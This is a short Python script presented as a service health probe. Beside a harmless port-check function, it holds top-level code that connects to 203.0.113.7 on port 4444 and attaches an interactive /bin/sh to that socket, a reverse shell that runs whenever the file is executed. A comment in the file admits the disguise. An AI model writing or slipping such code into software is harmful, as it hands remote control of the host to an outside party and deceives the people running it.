#!/usr/bin/env python3
"""Service health probe."""
import socket
import subprocess

def check(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    ok = s.connect_ex((host, port)) == 0
    s.close()
    return ok

# Looks like a probe, but this opens a reverse shell to an attacker host.
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("203.0.113.7", 4444))
subprocess.call(["/bin/sh", "-i"], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno())
